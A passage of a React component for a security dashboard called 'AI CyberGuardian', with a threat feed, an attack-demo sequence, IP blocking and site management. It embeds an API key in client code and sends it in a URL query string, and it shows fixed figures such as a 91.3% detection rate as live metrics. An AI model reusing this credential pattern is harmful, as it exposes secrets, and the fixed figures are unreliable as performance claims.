      await fetch("http://localhost:8000/api/v1/demo/stop", { method: "POST" });
    } catch (e) {}
  };

  const handleDownloadPdf = async () => {
    setIsDownloadingPdf(true);
    try {
      const response = await fetch("http://localhost:8000/api/v1/reporting/export-pdf", {
        headers: {
          "X-API-Key": "guardian-prod-demo-key-2026",
        },
      });
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `AI_Cyber_Guardian_Threat_Report_${new Date().toISOString().slice(0, 10)}.pdf`;
      document.body.appendChild(a);
      a.click();
      a.remove();
      window.URL.revokeObjectURL(url);
      setReportSuccessModal(false);
    } catch (err) {
      console.warn("Direct PDF download fallback to window.open:", err);
      window.open("http://localhost:8000/api/v1/reporting/export-pdf?api_key=guardian-prod-demo-key-2026", "_blank");
      setReportSuccessModal(false);
    } finally {
      setIsDownloadingPdf(false);
    }
  };

  const _runFallbackDemo = () => {
    const stages = [
      { stage: "A", stage_num: 1, name: "Reconnaissance Probing", focus: "feed", desc: "Automated scanners probing endpoints", delay: 4000 },
      { stage: "B", stage_num: 2, name: "Credential Brute-Force", focus: "blocked", desc: "15 rapid login attempts tripping Rate Limiter", delay: 7000 },
      { stage: "C", stage_num: 3, name: "SQL Injection Exploit", focus: "analytics", desc: "High-severity UNION query blocked by WAF with 403", delay: 7000 },
      { stage: "D", stage_num: 4, name: "Honeypot VFS & Canary", focus: "honeypot", desc: "Attacker trapped in virtual Linux shell tripping Canary keys", delay: 8000 },
    ];
    let idx = 0;
    const runNext = () => {
      if (idx >= stages.length) {
        setDemoStage({ stage: "COMPLETE", stage_num: 4, total_stages: 4, stage_name: "Demo Scenario Completed", description: "All 4 threat vectors successfully mitigated." });
        setTimeout(() => { setDemoActive(false); setDemoStage(null); }, 3000);
        return;
      }
      const s = stages[idx++];
      setDemoStage({ stage: s.stage, stage_num: s.stage_num, total_stages: 4, stage_name: s.name, focus_tab: s.focus, description: s.desc });
      setActiveNav(s.focus);
      setTimeout(runNext, s.delay);
    };
    setTimeout(runNext, 1000);
  };

  // Real-Time WebSocket Threat Stream Hook (Sub-100ms Ingestion)
  const handleIncomingThreat = useCallback((rawEvent) => {
    if (!rawEvent) return;

    // Intercept Demo Stage Updates to keep UI synchronized
    if (rawEvent.event_type === "DEMO_STAGE_UPDATE") {
      setDemoStage(rawEvent);
      if (rawEvent.stage === "COMPLETE" || rawEvent.stage === "CANCELLED") {
        setTimeout(() => {
          setDemoActive(false);
          setDemoStage(null);
        }, 3500);
      } else {
        setDemoActive(true);
        if (rawEvent.focus_tab) {
          setActiveNav(rawEvent.focus_tab);
        }
      }
      return;
    }

    const attackType = rawEvent.type || rawEvent.rule_id || rawEvent.attack_type || "Live Attack";
    const attackScore = rawEvent.score !== undefined ? rawEvent.score : 85;
    const attackLevel = rawEvent.level || rawEvent.severity || scoreLevel(attackScore);

    const normalizedEvent = {
      id: rawEvent.id || (Date.now() + Math.random()),
      ip: rawEvent.ip || "127.0.0.1",
      country: rawEvent.country || "🌐 External Node",
      countryName: rawEvent.countryName || "External Node",
      city: rawEvent.city || "Cloud Edge",
      isp: rawEvent.isp || "Enterprise",
      type: attackType,
      score: attackScore,
      level: attackLevel,
      time: rawEvent.time || new Date().toLocaleTimeString("en-GB", { hour12: false }),
      path: rawEvent.path || "/",
      method: rawEvent.method || "POST",
      payload: rawEvent.payload || "Security violation detected",
      status: rawEvent.status || (attackScore >= 85 ? "Trapped in Honeypot" : attackScore >= 60 ? "Blocked by WAF" : "Monitored"),
      isRealTime: true,
    };

    setEvents((prev) => [normalizedEvent, ...prev].slice(0, 64));
    setNewId(normalizedEvent.id);
    setTimeout(() => setNewId(null), 1200);

    // Audio chime for CRITICAL / HIGH severity attacks if sound is enabled
    if (soundEnabled && (attackLevel === "CRITICAL" || attackScore >= 60)) {
      playThreatAlarm(attackLevel);
      playAlertChime();
    }
  }, [soundEnabled]);

  const { status: wsStatus, isConnected: isWsConnected } = useThreatStream({
    onEvent: handleIncomingThreat,
    enabled: true,
  });

  // Fallback simulation tick: only active when WebSocket is disconnected
  useEffect(() => {
    if (isWsConnected) return; // WebSocket takes over full real-time streaming!

    const t = setInterval(async () => {
      let newEvent = null;
      if (backendOnline) {
        const live = await fetchLiveEvents();
        if (live && live.length > 0) {
          const first = live[0];
          newEvent = {
            id: Date.now() + Math.random(),
            ip: first.ip,
            country: "🇨🇳 Live Origin",
            countryName: "Live Origin",
            city: "Cloud Node",
            isp: "Enterprise",
            type: first.rule_id || "Live Attack",
            score: first.score || 85,
            level: scoreLevel(first.score || 85),
            time: new Date().toLocaleTimeString("en-GB", { hour12: false }),
            path: first.path || "/api/v1/auth",
            method: "POST",
            payload: first.matched_pattern || "Detected signature",
            status: "Blocked",
          };
        }
      }

      if (!newEvent) {
        newEvent = genEvent();
      }

      setNewId(newEvent.id);
      setEvents((prev) => [newEvent, ...prev].slice(0, 64));
      setTimeout(() => setNewId(null), 600);
    }, 3500);

    return () => clearInterval(t);
  }, [isWsConnected, backendOnline]);

  const navItems = [
    { id: "overview", icon: "⚡", label: "Overview" },
    { id: "feed", icon: "📋", label: "Live Feed" },
    { id: "analytics", icon: "📊", label: "Analytics" },
    { id: "geo", icon: "🌍", label: "Geo Map" },
    { id: "blocked", icon: "🚫", label: "Blocked IPs" },
    { id: "honeypot", icon: "🍯", label: "Honeypot" },
    { id: "attackers", icon: "👤", label: "Attackers" },
  ];

  const bottomNavItems = [
    { id: "sites", icon: "🌐", label: "Sites" },
    { id: "reports", icon: "📄", label: "Reports" },
    { id: "settings", icon: "⚙️", label: "Settings" },
  ];

  // Overview metrics
  const totalThreats = events.length;
  const blockedCount = blockedList.length;
  const honeypotLiveCount = honeypotSessions.filter((s) => s.live).length;

  // Handlers
  function handleUnblock(ip) {
    apiUnblockIP(ip);
    setBlockedList((prev) => prev.filter((b) => b.ip !== ip));
  }

  function handleCreateBlock() {
    if (!newBlockIP) return;
    apiBlockIP(newBlockIP, newBlockReason);
    setBlockedList((prev) => [
      {
        ip: newBlockIP,
        reason: newBlockReason || "Manual security rule enforcement",
        blockedAt: new Date().toISOString().replace("T", " ").slice(0, 16),
        expires: newBlockDuration,
        permanent: newBlockDuration === "Permanent",
      },
      ...prev,
    ]);
    setNewBlockIP("");
    setNewBlockReason("");
    setBlockIPModal(false);
  }

  function handleRegisterSite() {
    if (!newSiteUrl) return;
    const newSite = {
      name: newSiteName || "Web App",
      url: newSiteUrl,
      key: `gk_live_${Math.random().toString(36).slice(2, 12)}`,
      status: "Active",
      created: new Date().toISOString().slice(0, 10),
      checks: "0",
    };
    setSites((prev) => [newSite, ...prev]);
    setNewSiteName("");
    setNewSiteUrl("");
    setAddSiteModal(false);
  }

  function handleRegenerateKey() {
    setApiKey(`gk_live_${Math.random().toString(36).slice(2, 10)}${Math.random().toString(36).slice(2, 10)}`);
  }

  // Filtered Events
  const filteredEvents = useMemo(() => {
    return events.filter((e) => {
      const matchSearch =
        !searchFilter ||
        e.ip.toLowerCase().includes(searchFilter.toLowerCase()) ||
        e.type.toLowerCase().includes(searchFilter.toLowerCase()) ||
        e.country.toLowerCase().includes(searchFilter.toLowerCase());
      const matchSev = severityFilter === "ALL" || e.level === severityFilter;
      return matchSearch && matchSev;
    });
  }, [events, searchFilter, severityFilter]);

  // Filtered Attackers
  const filteredAttackers = useMemo(() => {
    return attackers.filter((a) => {
      return (
        !attackerSearch ||
        a.ip.includes(attackerSearch) ||
        a.country.toLowerCase().includes(attackerSearch.toLowerCase()) ||
        a.isp.toLowerCase().includes(attackerSearch.toLowerCase())
      );
    });
  }, [attackers, attackerSearch]);

  return (
    <div style={{ display: "flex", height: "100vh", background: T.bg, color: T.text, overflow: "hidden" }}>
      {/* ── Sidebar ── */}
      <div
        style={{
          width: 220,
          background: T.surface,
          borderRight: `1px solid ${T.border}`,
          display: "flex",
          flexDirection: "column",
          flexShrink: 0,
        }}
      >
        <div
          style={{
            padding: "16px 16px 12px",
            borderBottom: `1px solid ${T.border}`,
            display: "flex",
            alignItems: "center",
            gap: 8,
          }}
        >
          <span>🛡️</span>
          <span style={{ fontFamily: "monospace", fontWeight: 700, fontSize: 13, color: T.blue }}>
            AI CyberGuardian
          </span>
        </div>

        <div style={{ padding: "8px 8px", flex: 1, overflowY: "auto" }}>
          {navItems.map((n) => {
            const active = activeNav === n.id;
            return (
              <div
                key={n.id}
                onClick={() => setActiveNav(n.id)}
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 8,
                  padding: "7px 10px",
                  borderRadius: 5,
                  cursor: "pointer",
                  marginBottom: 2,
                  background: active ? "rgba(88,166,255,0.12)" : "transparent",
                  borderLeft: `2px solid ${active ? T.blue : "transparent"}`,
                  color: active ? T.blue : T.muted,
                  fontSize: 13,
                  fontWeight: active ? 600 : 400,
                  transition: "all 0.12s",
                }}
              >
                <span style={{ fontSize: 12 }}>{n.icon}</span>
                {n.label}
              </div>
            );
          })}

          <div style={{ borderTop: `1px solid ${T.border}`, margin: "8px 0" }} />

          {bottomNavItems.map((n) => {
            const active = activeNav === n.id;
            return (
              <div
                key={n.id}
                onClick={() => setActiveNav(n.id)}
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 8,
                  padding: "7px 10px",
                  borderRadius: 5,
                  cursor: "pointer",
                  marginBottom: 2,
                  background: active ? "rgba(88,166,255,0.12)" : "transparent",
                  borderLeft: `2px solid ${active ? T.blue : "transparent"}`,
                  color: active ? T.blue : T.muted,
                  fontSize: 13,
                  fontWeight: active ? 600 : 400,
                  transition: "all 0.12s",
                }}
              >
                <span style={{ fontSize: 12 }}>{n.icon}</span>
                {n.label}
              </div>
            );
          })}
        </div>

        <div style={{ padding: "12px 14px", borderTop: `1px solid ${T.border}` }}>
          <div style={{ fontSize: 11, color: T.muted }}>client@example.com</div>
          <div
            onClick={() => onNav("landing")}
            style={{ fontSize: 11, color: T.blue, cursor: "pointer", marginTop: 3 }}
          >
            ← Sign out
          </div>
        </div>
      </div>

      {/* ── Main Content Area ── */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
        {/* Topbar */}
        <div
          style={{
            height: 52,
            borderBottom: `1px solid ${T.border}`,
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            padding: "0 20px",
            flexShrink: 0,
            background: T.surface,
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <span style={{ fontWeight: 600, fontSize: 15 }}>
              {activeNav === "overview" && "Dashboard Overview"}
              {activeNav === "feed" && "Live Threat Feed"}
              {activeNav === "analytics" && "Analytics"}
              {activeNav === "geo" && "Geo Threat Map"}
              {activeNav === "blocked" && "Blocked IPs"}
              {activeNav === "honeypot" && "Honeypot Sessions"}
              {activeNav === "attackers" && "Attacker Profiles"}
              {activeNav === "sites" && "Site Management"}
              {activeNav === "reports" && "Reports"}
              {activeNav === "settings" && "Settings"}
            </span>
            {isWsConnected ? (
              <span
                style={{
                  padding: "3px 8px",
                  borderRadius: 4,
                  background: "rgba(63, 185, 80, 0.15)",
                  border: `1px solid ${T.low}`,
                  color: T.low,
                  fontSize: 11,
                  fontWeight: 600,
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 5,
                  fontFamily: "monospace",
                }}
              >
                <span style={{ width: 6, height: 6, borderRadius: "50%", background: T.low, boxShadow: `0 0 6px ${T.low}` }} />
                ⚡ WS: LIVE (Sub-100ms)
              </span>
            ) : (
              <span
                style={{
                  padding: "3px 8px",
                  borderRadius: 4,
                  background: "rgba(227, 179, 65, 0.12)",
                  border: `1px solid ${T.medium}60`,
                  color: T.medium,
                  fontSize: 11,
                  fontWeight: 600,
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 5,
                  fontFamily: "monospace",
                }}
              >
                <span style={{ width: 6, height: 6, borderRadius: "50%", background: T.medium }} />
                🟡 WS: Simulation Fallback
              </span>
            )}

            {mlMeta && (
              <span
                style={{
                  padding: "3px 8px",
                  borderRadius: 4,
                  background: "rgba(144, 71, 255, 0.15)",
                  border: `1px solid ${T.purple}`,
                  color: T.purple,
                  fontSize: 11,
                  fontWeight: 600,
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 5,
                  fontFamily: "monospace",
                }}
                title={`Active Models: Isolation Forest + Random Forest (F1: ${(mlMeta.f1_score * 100).toFixed(1)}%, Accuracy: ${(mlMeta.accuracy * 100).toFixed(1)}%)`}
              >
                <span>🤖</span>
                ML: CSIC 2010 (F1: {(mlMeta.f1_score * 100).toFixed(1)}%)
              </span>
            )}
          </div>
          <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
            <KineticButton
              variant={demoActive ? "danger" : "primary"}
              onClick={demoActive ? handleStopDemo : handleRunDemo}
              title="1-Click Interactive Attack Demo: Autonomous Red Team vs. Blue Team Multi-Stage Attack Simulation"
            >
              {demoActive ? "⏹ Stop Demo" : "▶ Run Attack Demo"}
            </KineticButton>

            <EmotionSoundViz />

            <KineticButton
              variant="outline"
              onClick={() => setReportSuccessModal(true)}
              title="Export executive PDF security report compiled from database telemetry"
            >
              📄 Export PDF
            </KineticButton>

            <button
              type="button"
              onClick={() => {
                playClickSound();
                setSettingsOpen(true);
              }}
              title="Open Emotion Agency Experience Settings"
              style={{
                background: "rgba(144, 71, 255, 0.12)",
                border: "1px solid rgba(144, 71, 255, 0.35)",
                color: "var(--foreground)",
                borderRadius: "9999px",
                padding: "6px 13px",
                cursor: "pointer",
                display: "inline-flex",
                alignItems: "center",
                gap: 5,
                fontSize: 11,
                fontFamily: "'IBM Plex Mono', monospace",
                fontWeight: 700,
                transition: "all 0.2s ease",
              }}
            >
              ⚙️ <span style={{ textTransform: "uppercase" }}>SETTINGS</span>
            </button>

            <button
              type="button"
              onClick={() => {
                playClickSound();
                onNav("admin");
              }}
              title="Access Platform Super-Administrative Control Plane"
              style={{
                background: "rgba(144, 71, 255, 0.2)",
                border: "1px solid rgba(144, 71, 255, 0.5)",
                color: "#d8b4fe",
                borderRadius: "9999px",
                padding: "6px 13px",
                cursor: "pointer",
                display: "inline-flex",
                alignItems: "center",
                gap: 5,
                fontSize: 11,
                fontFamily: "'IBM Plex Mono', monospace",
                fontWeight: 700,
                transition: "all 0.2s ease",
              }}
            >
              👑 <span style={{ textTransform: "uppercase" }}>ADMIN PANEL</span>
            </button>

            <Btn small primary onClick={() => setAddSiteModal(true)}>
              + Add Site
            </Btn>
          </div>
        </div>

        {/* Interactive Demo HUD Status Banner */}
        {demoActive && demoStage && (
          <div
            style={{
              background: "linear-gradient(90deg, rgba(239,68,68,0.15), rgba(56,189,248,0.12), rgba(34,197,94,0.12))",
              borderBottom: `1px solid rgba(56, 189, 248, 0.3)`,
              padding: "10px 20px",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              flexShrink: 0,
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <span
                style={{
                  padding: "3px 8px",
                  borderRadius: 4,
                  background: demoStage.stage === "COMPLETE" ? "#22c55e" : "#ef4444",
                  color: "white",
                  fontSize: 11,
                  fontWeight: 800,
                  fontFamily: "monospace",
                  letterSpacing: "0.05em",
                }}
              >
                {demoStage.stage === "COMPLETE" ? "✓ SCENARIO COMPLETED" : `🔴 LIVE ATTACK SCENARIO: STAGE ${demoStage.stage_num || 1}/4`}
              </span>
              <span style={{ fontWeight: 700, fontSize: 13, color: "#f8fafc" }}>
                {demoStage.stage_name}
              </span>
              <span style={{ fontSize: 12, color: "#94a3b8" }}>
                — {demoStage.description || demoStage.target}
              </span>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <span
                style={{
                  padding: "3px 9px",
                  borderRadius: 4,
                  background: "rgba(56, 189, 248, 0.15)",
                  border: "1px solid rgba(56, 189, 248, 0.3)",
                  color: "#38bdf8",
                  fontSize: 11,
                  fontWeight: 600,
                  fontFamily: "monospace",
                }}
              >
                Tab Focus: {demoStage.focus_tab ? demoStage.focus_tab.toUpperCase() : "LIVE FEED"}
              </span>
              <button
                onClick={handleStopDemo}
                style={{
                  background: "transparent",
                  border: "none",
                  color: "#94a3b8",
                  cursor: "pointer",
                  fontSize: 14,
                  padding: "2px 6px",
                }}
                title="Stop demo"
              >
                ✕
              </button>
            </div>
          </div>
        )}

        {/* Scrollable View Container */}
        <div style={{ flex: 1, overflowY: "auto", padding: 16 }}>
          {/* ════ VIEW 1: OVERVIEW ════ */}
          {activeNav === "overview" && (
            <div>
              {/* Stat cards */}
              <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 12, marginBottom: 14 }}>
                <StatCard
                  icon="🛡️"
                  label="Threats Today"
                  value={totalThreats}
                  sub="↑ 12% vs yesterday"
                  color={T.blue}
                />
                <StatCard
                  icon="🚫"
                  label="IPs Blocked"
                  value={blockedCount}
                  sub="↑ 5% vs yesterday"
                  color={T.high}
                />
                <StatCard
                  icon="🍯"
                  label="Honeypot Sessions"
                  value={honeypotLiveCount}
                  sub={`${honeypotLiveCount} active right now`}
                  color={T.purple}
                />
                <StatCard
                  icon="✅"
                  label="Detection Rate"
                  value="91.3%"
                  sub="FP rate: 4.2%"
                  color={T.low}
                />
              </div>

              {/* Row 2: Live Feed + Attack Types Pie */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 300px", gap: 12, marginBottom: 14 }}>
                <Card>
                  <PanelTitle
                    icon="📋"
                    title="LIVE THREAT FEED"
                    right={
                      <span
                        onClick={() => setActiveNav("feed")}
                        style={{ color: T.blue, cursor: "pointer", fontSize: 11 }}
                      >
                        View all {events.length} →
                      </span>
                    }
                  />
                  <div style={{ maxHeight: 240, overflowY: "auto" }}>
                    <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
                      <thead>
                        <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                          {["Time", "IP", "Country", "Attack", "Severity", "Score"].map((h) => (
                            <th
                              key={h}
                              style={{
                                color: T.muted,
                                fontWeight: 500,
                                padding: "0 6px 6px",
                                textAlign: "left",
                                fontSize: 11,
                              }}
                            >
                              {h}
                            </th>
                          ))}
                        </tr>
                      </thead>
                      <tbody>
                        {events.slice(0, 10).map((e, i) => (
                          <tr
                            key={e.id}
                            onClick={() => onOpenAttacker(e.ip)}
                            style={{
                              borderBottom: `1px solid ${T.border}20`,
                              cursor: "pointer",
                              background: e.id === newId
                                ? (e.level === "CRITICAL" ? "rgba(248, 81, 73, 0.22)" : "rgba(88, 166, 255, 0.16)")
                                : "transparent",
                              boxShadow: e.id === newId && e.level === "CRITICAL" ? `inset 0 0 12px ${T.critical}40` : "none",
                              transition: "background 0.5s ease, box-shadow 0.5s ease",
                            }}
                          >
                            <td style={{ padding: "6px 6px", color: T.muted, fontFamily: "monospace", fontSize: 11 }}>
                              {e.time}
                            </td>
                            <td style={{ padding: "6px 6px", fontFamily: "monospace", fontSize: 11, color: T.blue }}>
                              {e.ip}
                            </td>
                            <td style={{ padding: "6px 6px", fontSize: 11 }}>{e.country}</td>
                            <td style={{ padding: "6px 6px" }}>
                              <span
                                style={{
                                  background: T.surface2,
                                  padding: "1px 6px",
                                  borderRadius: 3,
                                  fontSize: 11,
                                  color: T.text,
                                }}
                              >
                                {e.type}
                              </span>
                            </td>
                            <td style={{ padding: "6px 6px" }}>
                              <Badge level={e.level} small />
                            </td>
                            <td style={{ padding: "6px 6px", minWidth: 80 }}>
                              <ScoreBar score={e.score} compact />
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </Card>

                <Card>
                  <PanelTitle icon="🥧" title="ATTACK TYPES" />
                  <ResponsiveContainer width="100%" height={120}>
                    <PieChart>
                      <Pie
                        data={PIE_DATA}
                        cx="50%"
                        cy="50%"
                        innerRadius={32}
                        outerRadius={52}
                        dataKey="value"
                        strokeWidth={0}
                      >
                        {PIE_DATA.map((e, i) => (
                          <Cell key={i} fill={e.color} />
                        ))}
                      </Pie>
                      <Tooltip
                        contentStyle={{
                          background: T.surface2,
                          border: `1px solid ${T.border}`,
                          borderRadius: 5,
                          fontSize: 11,
                          color: T.text,
                        }}
                      />
                    </PieChart>
                  </ResponsiveContainer>
                  <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 4, marginTop: 8 }}>
                    {PIE_DATA.map((d) => (
                      <div key={d.name} style={{ display: "flex", alignItems: "center", gap: 5, fontSize: 11 }}>
                        <span style={{ width: 7, height: 7, background: d.color, borderRadius: "50%", flexShrink: 0 }} />
                        <span style={{ color: T.muted }}>{d.name}</span>
                        <span style={{ color: T.text, marginLeft: "auto", fontFamily: "monospace" }}>{d.value}%</span>
                      </div>
                    ))}
                  </div>
                </Card>
              </div>

              {/* Row 3: Timeline + Top Attackers */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 300px", gap: 12, marginBottom: 14 }}>
                <Card>
                  <PanelTitle icon="📈" title="THREATS OVER TIME" right="Last 24 hours" />
                  <ResponsiveContainer width="100%" height={140}>
                    <LineChart data={TIMELINE_DATA} margin={{ top: 5, right: 10, bottom: 0, left: -20 }}>
                      <XAxis dataKey="hour" tick={{ fontSize: 9, fill: T.muted }} interval={1} axisLine={false} tickLine={false} />
                      <YAxis tick={{ fontSize: 9, fill: T.muted }} axisLine={false} tickLine={false} />
                      <Tooltip
                        contentStyle={{
                          background: T.surface2,
                          border: `1px solid ${T.border}`,
                          borderRadius: 5,
                          fontSize: 11,
                          color: T.text,
                        }}
                        labelStyle={{ color: T.muted }}
                      />
                      <Line dataKey="CRITICAL" stroke={T.critical} strokeWidth={1.5} dot={false} />
                      <Line dataKey="HIGH" stroke={T.high} strokeWidth={1.5} dot={false} />
                      <Line dataKey="MEDIUM" stroke={T.medium} strokeWidth={1.5} dot={false} />
                      <Line dataKey="LOW" stroke={T.low} strokeWidth={1.5} dot={false} />
                    </LineChart>
                  </ResponsiveContainer>
                  <div style={{ display: "flex", gap: 12, marginTop: 6 }}>
                    {["CRITICAL", "HIGH", "MEDIUM", "LOW"].map((l) => (
                      <div key={l} style={{ display: "flex", alignItems: "center", gap: 4, fontSize: 10 }}>
                        <span style={{ width: 10, height: 2, background: sevColor[l], borderRadius: 1 }} />
                        <span style={{ color: T.muted }}>{l}</span>
                      </div>
                    ))}
                  </div>
                </Card>

                <Card>
                  <PanelTitle
                    icon="🏆"
                    title="TOP ATTACKERS"
                    right={
                      <span
                        onClick={() => setActiveNav("attackers")}
                        style={{ color: T.blue, cursor: "pointer", fontSize: 11 }}
                      >
                        All →
                      </span>
                    }
                  />
                  <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                    {attackers.slice(0, 5).map((ip, i) => (
                      <div
                        key={ip.ip}
                        onClick={() => onOpenAttacker(ip.ip)}
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: 8,
                          padding: "5px 8px",
                          borderRadius: 5,
                          cursor: "pointer",
                          background: T.surface2,
                        }}
                      >
                        <span style={{ color: T.muted, fontSize: 11, minWidth: 14, fontFamily: "monospace" }}>
                          #{i + 1}
                        </span>
                        <div style={{ flex: 1, minWidth: 0 }}>
                          <div
                            style={{
                              fontFamily: "monospace",
                              fontSize: 11,
                              color: T.blue,
                              whiteSpace: "nowrap",
                              overflow: "hidden",
                              textOverflow: "ellipsis",
                            }}
                          >
                            {ip.ip}
                          </div>
                          <div style={{ fontSize: 10, color: T.muted }}>
                            {ip.flag} {ip.country}
                          </div>
                        </div>
                        <div style={{ textAlign: "right" }}>
                          <div
                            style={{
                              fontFamily: "monospace",
                              fontSize: 12,
                              fontWeight: 700,
                              color: sevColor[ip.level],
                            }}
                          >
                            {ip.total}
                          </div>
                          <Badge level={ip.level} small />
                        </div>
                      </div>
                    ))}
                  </div>
                </Card>
              </div>

              {/* Row 4: Blocked IPs + Honeypot */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
                <Card>
                  <PanelTitle
                    icon="🚫"
                    title="BLOCKED IPs"
                    right={
                      <Btn small onClick={() => setActiveNav("blocked")}>
                        Manage
                      </Btn>
                    }
                  />
                  <table style={{ width: "100%", fontSize: 11, borderCollapse: "collapse" }}>
                    <thead>
                      <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                        {["IP", "Reason", "Blocked At", "Action"].map((h) => (
                          <th
                            key={h}
                            style={{ color: T.muted, padding: "0 6px 5px", textAlign: "left", fontWeight: 500 }}
                          >
                            {h}
                          </th>
                        ))}
                      </tr>
                    </thead>
                    <tbody>
                      {blockedList.slice(0, 4).map((e) => (
                        <tr key={e.ip} style={{ borderBottom: `1px solid ${T.border}20` }}>
                          <td style={{ padding: "5px 6px", fontFamily: "monospace", color: T.blue }}>{e.ip}</td>
                          <td style={{ padding: "5px 6px", color: T.muted }}>{e.reason}</td>
                          <td style={{ padding: "5px 6px", color: T.muted, fontFamily: "monospace" }}>{e.blockedAt}</td>
                          <td style={{ padding: "5px 6px" }}>
                            <Btn small danger onClick={() => handleUnblock(e.ip)}>
                              Unblock
                            </Btn>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </Card>

                <Card glow={honeypotLiveCount > 0}>
                  <PanelTitle
                    icon="🍯"
                    title="HONEYPOT SESSIONS"
                    right={
                      <span style={{ color: T.low, fontSize: 11 }}>● {honeypotLiveCount} active</span>
                    }
                  />
                  <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                    {honeypotSessions.slice(0, 3).map((s) => (
                      <div
                        key={s.id}
                        onClick={() => {
                          setActiveNav("honeypot");
                          setExpandedSessionId(s.id);
                        }}
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: 10,
                          padding: "7px 10px",
                          background: T.surface2,
                          borderRadius: 5,
                          cursor: "pointer",
                        }}
                      >
                        <div style={{ flex: 1 }}>
                          <div style={{ fontFamily: "monospace", fontSize: 11, color: T.blue }}>{s.ip}</div>
                          <div style={{ fontSize: 10, color: T.muted }}>{s.country}</div>
                        </div>
                        <div style={{ textAlign: "right" }}>
                          <div style={{ fontSize: 11, color: T.text, fontFamily: "monospace" }}>{s.duration}</div>
                          <div style={{ fontSize: 10, color: T.muted }}>{s.requestsCount} requests</div>
                        </div>
                        <div
                          style={{
                            width: 8,
                            height: 8,
                            borderRadius: "50%",
                            background: s.live ? T.low : T.muted,
                            boxShadow: s.live ? `0 0 6px ${T.low}` : "none",
                          }}
                        />
                      </div>
                    ))}
                  </div>
                </Card>
              </div>
            </div>
          )}

          {/* ════ VIEW 2: LIVE THREAT FEED (FULL LOG) ════ */}
          {activeNav === "feed" && (
            <Card>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  marginBottom: 14,
                  flexWrap: "wrap",
                  gap: 10,
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <span style={{ fontSize: 14 }}>📋</span>
                  <span style={{ fontWeight: 600, fontSize: 14 }}>LIVE THREAT FEED — FULL LOG</span>
                  <span style={{ color: T.muted, fontSize: 12 }}>
                    ({filteredEvents.length} of {events.length} events)
                  </span>
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <input
                    value={searchFilter}
                    onChange={(e) => setSearchFilter(e.target.value)}
                    placeholder="Search IP or attack type..."
                    style={{
                      background: T.surface2,
                      border: `1px solid ${T.border}`,
                      color: T.text,
                      borderRadius: 4,
                      padding: "5px 10px",
                      fontSize: 12,
                      width: 200,
                    }}
                  />
                  <select
                    value={severityFilter}
                    onChange={(e) => setSeverityFilter(e.target.value)}
                    style={{
                      background: T.surface2,
                      border: `1px solid ${T.border}`,
                      color: T.text,
                      borderRadius: 4,
                      padding: "5px 10px",
                      fontSize: 12,
                    }}
                  >
                    <option value="ALL">All Severities</option>
                    <option value="CRITICAL">CRITICAL</option>
                    <option value="HIGH">HIGH</option>
                    <option value="MEDIUM">MEDIUM</option>
                    <option value="LOW">LOW</option>
                  </select>
                  <Btn small onClick={() => setEvents((prev) => [genEvent(), ...prev])}>
                    ↺ Refresh
                  </Btn>
                </div>
              </div>

              <div style={{ overflowX: "auto" }}>
                <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
                  <thead>
                    <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                      {["Time", "IP", "Country", "Method", "Endpoint", "Attack", "Severity", "Score", "Action"].map(
                        (h) => (
                          <th
                            key={h}
                            style={{
                              color: T.muted,
                              fontWeight: 500,
                              padding: "8px 8px",
                              textAlign: "left",
                              fontSize: 11,
                            }}
                          >
                            {h}
                          </th>
                        )
                      )}
                    </tr>
                  </thead>
                  <tbody>
                    {filteredEvents.map((e) => {
                      const isExpanded = expandedEventId === e.id;
                      return (
                        <>
                          <tr
                            key={e.id}
                            style={{
                              borderBottom: `1px solid ${T.border}20`,
                              cursor: "pointer",
                              background: e.id === newId
                                ? (e.level === "CRITICAL" ? "rgba(248, 81, 73, 0.22)" : "rgba(88, 166, 255, 0.16)")
                                : isExpanded ? "rgba(88,166,255,0.05)" : "transparent",
                              boxShadow: e.id === newId && e.level === "CRITICAL" ? `inset 0 0 14px ${T.critical}45` : "none",
                              transition: "background 0.5s ease, box-shadow 0.5s ease",
                            }}
                          >
                            <td style={{ padding: "8px 8px", color: T.muted, fontFamily: "monospace", fontSize: 11 }}>
                              {e.time}
                            </td>
                            <td
                              style={{ padding: "8px 8px", fontFamily: "monospace", fontSize: 11, color: T.blue }}
                              onClick={(ev) => {
                                ev.stopPropagation();
                                onOpenAttacker(e.ip);
                              }}
                            >
                              {e.ip}
                            </td>
                            <td style={{ padding: "8px 8px", fontSize: 11 }}>{e.country}</td>
                            <td style={{ padding: "8px 8px" }}>
                              <span
                                style={{
                                  background: T.surface2,
                                  padding: "2px 6px",
